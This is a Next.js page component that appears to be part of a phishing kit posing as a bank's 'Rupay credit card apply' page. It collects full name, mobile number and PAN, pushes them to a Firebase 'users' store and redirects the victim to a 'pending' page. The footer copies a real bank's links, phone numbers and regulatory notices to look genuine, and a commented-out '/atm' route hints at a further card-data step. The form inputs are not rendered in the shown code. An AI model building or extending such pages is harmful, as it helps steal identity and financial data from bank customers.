"use client";
import { useState } from "react";
import { ref, push } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Home() {
  const router = useRouter();

  const [formData, setFormData] = useState({
    full_name: "",
    mobile: "",
    pan: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;

    if (name === "mobile") {
      // Allow only numbers and restrict to 10 digits
      value = value.replace(/\D/g, "").slice(0, 10);
    } else if (name === "dob") {
      // Format date input to DD/MM/YYYY
      value = value.replace(/\D/g, "");
      if (value.length <= 2) {
        value = value;
      } else if (value.length <= 4) {
        value = `${value.slice(0, 2)}/${value.slice(2)}`;
      } else {
        value = `${value.slice(0, 2)}/${value.slice(2, 4)}/${value.slice(
          4,
          8
        )}`;
      }
    } else if (name === "pan") {
      // Allow only letters and numbers, ensure uppercase, and restrict to 10 characters
      value = value
        .replace(/[^A-Z0-9]/gi, "")
        .toUpperCase()
        .slice(0, 10);

      // Ensure it follows the PAN pattern: 5 letters, 4 digits, 1 letter
      const firstPart = value.slice(0, 5).replace(/[^A-Z]/g, "");
      const secondPart = value.slice(5, 9).replace(/[^0-9]/g, "");
      const thirdPart = value.slice(9, 10).replace(/[^A-Z]/g, "");

      value = firstPart + secondPart + thirdPart;
    }

    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formRef = ref(database, "users");
    const newFormRef = await push(formRef, formData);
    const newFormId = newFormRef.key;

    // Save the ID to local storage
    localStorage.setItem("formId", newFormId);

    router.push("/pending");
    setFormData({
      full_name: "",
      mobile: "",
      pan: "",
    });
  };
  return (
    <div className="">
      {/* Header */}
      <div className="h-[60px] shadow-md w-full flex justify-between items-center px-4">
        {/* Menu Icon */}
        <div className="flex items-center space-x-4">
          <span className="">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="30"
              height="30"
              fill="#004880"
              class="bi bi-list"
              viewBox="0 0 16 16"
            >
              <path
                fill-rule="evenodd"
                d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5"
              />
            </svg>
          </span>
          <img src="https://www.tvs-e.in/wp-content/uploads/2020/08/support.png" alt="logo" className="h-12" />
        </div>
        <div className="flex space-x-5">
          <span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-search"
              viewBox="0 0 16 16"
            >
              <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001q.044.06.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1 1 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0" />
            </svg>
          </span>
          <span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-geo-alt"
              viewBox="0 0 16 16"
            >
              <path d="M12.166 8.94c-.524 1.062-1.234 2.12-1.96 3.07A32 32 0 0 1 8 14.58a32 32 0 0 1-2.206-2.57c-.726-.95-1.436-2.008-1.96-3.07C3.304 7.867 3 6.862 3 6a5 5 0 0 1 10 0c0 .862-.305 1.867-.834 2.94M8 16s6-5.686 6-10A6 6 0 0 0 2 6c0 4.314 6 10 6 10" />
              <path d="M8 8a2 2 0 1 1 0-4 2 2 0 0 1 0 4m0 1a3 3 0 1 0 0-6 3 3 0 0 0 0 6" />
            </svg>
          </span>
          <span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-info-circle"
              viewBox="0 0 16 16"
            >
              <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16" />
              <path d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0" />
            </svg>
          </span>
          <span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-person-circle"
              viewBox="0 0 16 16"
            >
              <path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0" />
              <path
                fill-rule="evenodd"
                d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8m8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1"
              />
            </svg>
          </span>
        </div>
      </div>
      {/* Body */}
      <div className="p-6">
        <form
          className="space-y-6 flex flex-col justify-center"
          onSubmit={handleSubmit}
          id="first-form"
          //   action="/atm"
        >
          {/* Title */}
          <div className="w-full text-xl font-semibold">
            <span>Rupay credit card apply</span>
          </div>
          

          <div className="w-full flex justify-center items-center">
            <button
              className="bg-gradient-to-r from-[#004880] to-[#004880] text-white font-bold py-2 px-10 rounded focus:outline-none focus:shadow-outline w-full mt-5"
              type="submit"
            //   On Click goto pending page 
            onClick={() => router.push("/pending")}
            >
              Proceed
            </button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <footer class="bg-[#093252] text-white">
        <div class="p-10">
          <div class="">
            <div class="">
              <div class="">
                <div class="flex flex-col py-10">
                  <div class="text-xs font-italic my-5 !text-[#2C8BBC]">
                    All you may want to know
                  </div>
                  <div class="flbody">
                    <div class="d-xl-flex">
                      <div class="card ">
                        <div class="flex justify-between my-2">
                          <h2 class="mb-0">
                            <button class="btn btn-link btn-block text-left text-sm">
                              About Customer Support
                            </button>
                          </h2>
                          <div class="flex items-center space-x-2">
                            <div class="">+</div>
                          </div>
                        </div>
                        <div>
                          <div class="flex flex-col text-xs text-gray-400">
                            <ul class="space-y-3">
                              <li>
                                <a href="/about-us"> About Us </a>
                              </li>
                              <li>
                                <a href="/Our-Story"> Our Story </a>
                              </li>
                              <li>
                                <a href="/our-philosophy"> Our Philosophy </a>
                              </li>
                              <li>
                                <a href="/our-board-of-directors">
                                  {" "}
                                  Board of Directors{" "}
                                </a>
                              </li>
                              <li>
                                <a href="/leadership-team"> Leadership Team </a>
                              </li>
                              <li>
                                <a href="/beyond-banking"> Beyond Banking </a>
                              </li>
                              <li>
                                <a href="/customer-stories">
                                  {" "}
                                  Customer Stories{" "}
                                </a>
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                      <div class="card  order-xl-2 mt-5">
                        <div class="flex justify-between">
                          <h2 class="mb-0">
                            <button class="btn btn-link btn-block text-left collapsed text-sm">
                              Investors’ Corner
                            </button>
                          </h2>
                          <div class="flex">
                            <div class="plus">+</div>
                          </div>
                        </div>
                      </div>
                      <div class="card">
                        <div class="flex justify-between" id="flheadingThree">
                          <h2 class="mb-0">
                            <button class="btn btn-link btn-block text-left  collapsed text-sm">
                              Media Section
                            </button>
                          </h2>
                          <div class="fa fa-plus">
                            <div class="plus">+</div>
                          </div>
                        </div>
                      </div>
                      <div class="card  order-xl-2    ">
                        <div class="flex justify-between">
                          <h2 class="mb-0">
                            <button class="btn btn-link btn-block text-left  collapsed text-sm">
                              DICGC
                            </button>
                          </h2>
                          <div class="fa fa-plus">
                            <div class="plus">+</div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div class="col-12 accblock col-lg-6 col-xl-4 mayneed">
                <div class="f-links">
                  <div class="flhead font-italic my-5 !text-[#2C8BBC] text-xs">
                    All you may need
                  </div>
                  <div class="flbody">
                    <div class="d-xl-flex">
                      <div class="card w-full">
                        <div class="flex justify-between">
                          <h2 class="mb-0">
                            <button class="btn btn-link btn-block text-left collapsed">
                              Join Us
                            </button>
                          </h2>
                          <div class="fa fa-plus">
                            <div class="plus">+</div>
                          </div>
                        </div>
                      </div>
                      <div class="card  order-xl-2    ">
                        <div class="card-header flex justify-between">
                          <h2 class="mb-0">
                            <button
                              class="btn btn-link btn-block text-left collapsed text-sm"
                              type="button"
                            >
                              Offers
                            </button>
                          </h2>
                          <div class="fa fa-plus">
                            <div class="plus">+</div>
                          </div>
                        </div>
                      </div>
                      <div class="card ">
                        <div class="card-header flex justify-between">
                          <h2 class="mb-0">
                            <button class="btn btn-link btn-block text-left collapsed text-sm">
                              Tools &amp; Resources
                            </button>
                          </h2>
                          <div class="fa fa-plus">
                            <div class="plus">+</div>
                          </div>
                        </div>
                      </div>
                      <div class="card  order-xl-2">
                        <div class="card-header flex justify-between">
                          <h2 class="mb-0">
                            <button
                              class="btn btn-link btn-block text-left collapsed text-sm"
                              type="button"
                            >
                              Help
                            </button>
                          </h2>
                          <div class="fa fa-plus">
                            <div class="plus">+</div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div class="col-12  col-xl-2 mt-10">
                <div class="sociallinks">
                  <div class="f-links">
                    <div class="flhead font-italic text-xs !text-[#2C8BBC]">
                      Let's get social
                    </div>
                  </div>
                  <div className="">
                    <nav className="flex space-x-5 mt-5">
                      <a
                        href=""
                        class="fb"
                        target="_blank"
                      >
                        <img
                          src="/facebook.png"
                          class="img-fluid"
                          alt="facebook"
                        />
                      </a>

                      <a
                        href=""
                        class="tw"
                        target="_blank"
                      >
                        <img
                          src="/x-icon.png"
                          class="img-fluid"
                          alt="twitter"
                        />
                      </a>

                      <a
                        href=""
                        class="yt"
                        target="_blank"
                      >
                        <img
                          src="/youtube.png"
                          class="img-fluid"
                          alt="youtube"
                        />
                      </a>

                      <a
                        href=""
                        class="lin"
                        target="_blank"
                      >
                        <img
                          src="/linkedin.png"
                          class="img-fluid"
                          alt="linkedin"
                        />
                      </a>

                      <a
                        href=""
                        class="yt"
                        target="_blank"
                      >
                        <img
                          src="/instagram.png"
                          class="img-fluid"
                          alt="youtube"
                        />
                      </a>
                    </nav>
                  </div>
                </div>
                <div class="sociallinks mt-10">
                  <div>
                    <nav
                      role="navigation"
                      aria-labelledby="block-mobileappdownload-menu"
                      id="block-mobileappdownload"
                    >
                      <h2 class="flhead font-italic text-xs !text-[#2C8BBC]">
                        Mobile App download
                      </h2>

                      <div className="flex mt-5">
                        <a
                          href=""
                          class="apps"
                          target="_blank"
                        >
                          <img
                            src="/googleplay.png"
                            class="img-fluid"
                            alt="android"
                          />
                        </a>

                        <a
                          href=""
                          class="apps"
                          target="_blank"
                        >
                          <img
                            src="/appstore.png"
                            class="img-fluid"
                            alt="android"
                          />
                        </a>
                      </div>
                    </nav>
                  </div>

                  <div class="calling flex flex-col text-xs mt-5">
                    <div>
                      Toll-free no.{" "}
                      <a href="tel:1800-258-8181"> 1800-258-8181 </a>
                    </div>
                    <div>
                      Customer care no.{" "}
                      <a href="tel:033-4409-9090"> 033-4409-9090</a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="footer-dark mt-10 text-xs bg-[#051E31] p-10">
          <div class="container-fluid">
            <div class="row">
              <div class="col-12">
                <div class="flinks">
                  {/* <!-- End Google Tag Manager (noscript) --> */}

                  <div class="flhead font-italic text-xs !text-[#2C8BBC]">
                    Terms, Polices &amp; Regulations
                  </div>
                  <div class="flbody mt-5">
                    <div class="grid grid-cols-3 gap-4 text-gray-500">
                      <a href="/terms-policies">Terms &amp; Policies</a>

                      <a href="/regulatory-disclosures">
                        Regulatory Disclosures
                      </a>

                      <a href="/rates-charges">Rates &amp; Charges</a>

                      <a href="/grievance-redressal?selected=101">
                        Unauthorised Electronic Transactions
                      </a>

                      <a
                        href="https://www.rbi.org.in/CommonPerson/english/scripts/rbikehtahai.aspx"
                        target="_blank"
                      >
                        RBI Kehta Hai
                      </a>

                      <a href="/RBI-Advisory-Notifications">
                        RBI Advisory Notifications
                      </a>

                      <a href="/iba-notices">IBA Notifications</a>

                      <a href="/PMAY-CLSS">PMAYCLSS</a>

                      <a href="/lea-contact">
                        Contact for Law Enforcement Agencies
                      </a>

                      <a href="/services-for-differently-abled-customer">
                        Services for Differently Abled
                      </a>

                      <a href="/positive-pay-system">Positive Pay System</a>

                      <a
                        href="/sites/default/files/2024-03/Active-Aadhaar-enrolment-Centers-270324.xlsx"
                        download=""
                      >
                        Aadhaar Enrollment Centers
                      </a>

                      <a
                        href=""
                        target="_blank"
                      >
                        State Wise GST
                      </a>

                      <a
                        href="/sites/default/files/2020-12/Disclaimer.pdf"
                        target="_blank"
                      >
                        Disclaimer
                      </a>

                      <a href="/notices">Notices</a>

                      <a href="/properties-for-sale">Properties for Sale</a>

                      <a
                        href="/sites/default/files/2020-12/US-Patriot-Act-Certification.pdf"
                        target="_blank"
                      >
                        US Patriot Act Certification
                      </a>

                      <a href="/communication-archives">
                        Communication Archives
                      </a>

                      <a href="/home-loan-nach-mandate-cancellation">
                        Home Loan NACH Mandate Cancellation
                      </a>

                      <a href="">
                        Safe Digital Banking Practices
                      </a>

                      <a href="/sites/default/files/2022-06/modus-operandi-of-financial-fraudsterspdf-1.pdf">
                        RBI BE(A)WARE
                      </a>

                      <a href="/shukriya-akam">Shukriya - AKAM</a>

                      <a href="https://www.dicgc.org.in/" target="_blank">
                        DICGC ( Deposit Insurance &amp; Credit Guarantee
                        Corporations )
                      </a>

                      <a href="">
                        Portfolio Sale
                      </a>

                      <a href="/unclaimed-deposits">Unclaimed Deposits</a>

                      <a href="">
                        Loan Scheme Change
                      </a>

                      <a href="">
                        Secured Asset Possessed Under SARFAESI Act 2002
                      </a>
                    </div>{" "}
                  </div>
                </div>{" "}
              </div>
            </div>
            <div class="copyrights mt-10 text-gray-400">
              <p>
                Customer Support is ISO27001:2013 certified
                <br />© 2024&nbsp;Customer Support. All Rights Reserved
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
